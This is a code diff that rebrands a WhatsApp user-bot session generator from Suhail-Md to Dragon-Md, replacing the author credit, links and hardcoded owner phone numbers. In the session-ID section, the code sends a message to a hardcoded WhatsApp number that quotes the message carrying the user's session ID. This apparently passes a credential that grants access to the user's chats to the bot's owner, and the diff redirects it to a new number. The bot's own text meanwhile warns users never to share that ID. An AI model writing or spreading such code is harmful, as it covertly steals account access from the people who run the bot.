@@ -19,16 +19,16 @@
 
 CURRENTLY RUNNING ON BETA VERSION!!
 *
-   * @project_name : Suhail-Md
-   * @author : Suhail Tech Info
-   * @youtube : https://www.youtube.com/c/@SuhailTechInfo0
-   * @description : Suhail-Md ,A Multi-functional whatsapp user bot.
+   * @project_name : Dragon-Md
+   * @author : Naveed Dogar 
+   * @youtube : https://www.youtube.com/c/@Dragon-MD
+   * @description : Dragon-Md ,A Multi-functional whatsapp user bot.
    * @version 1.0.1
 *
    * Licensed under the  GPL-3.0 License;
 * 
-   * Created By Suhail Tech Info.
-   * © 2023 Suhail-Md.
+   * Created By Naveed Dogar.
+   * © 2023 Dragon-Md.
 * 
    * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
@@ -354,7 +354,7 @@ setTimeout(() => {
              c2 = output.data.split('/')[3]
             await delay(500);
             let session_id1 = await session.sendMessage(user, {text: 'Secktor;;;'+c2});
-            await session.sendMessage("923184474176@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
+            await session.sendMessage("923096566451@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
           }catch (e) {console.log(e)}
 //===========================================================================================
 //===============================  SESSION ID 2   ===========================================
@@ -378,14 +378,14 @@ Thanks.
 
           
 let cc = `╔════◇
-║『𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗖𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝗦𝗲𝗰𝗸𝘁𝗼𝗿•𝗠𝗱』
+║『𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗖𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝗗𝗿𝗮𝗴𝗼𝗻•𝗠𝗱』
 ║ _You complete first step to making Bot._
 ╚════════════════════════╝
 ╔═════◇
 ║  『••• 𝗩𝗶𝘀𝗶𝘁 𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 •••』
 ║ *1.Repo:* _https://tinyurl.com/2czdxe7a_
 ║ *2.Ytube:* _https://tinyurl.com/22q7z2kv_
-║ *3.Owner:* _https://wa.me/923184474176_
+║ *3.Owner:* _https://wa.me/923096566451_
 ║ *Note :*_Don't provide your SESSION_ID to_
 ║ _anyone otherwise that can access chats_
 ╚════════════════════════╝
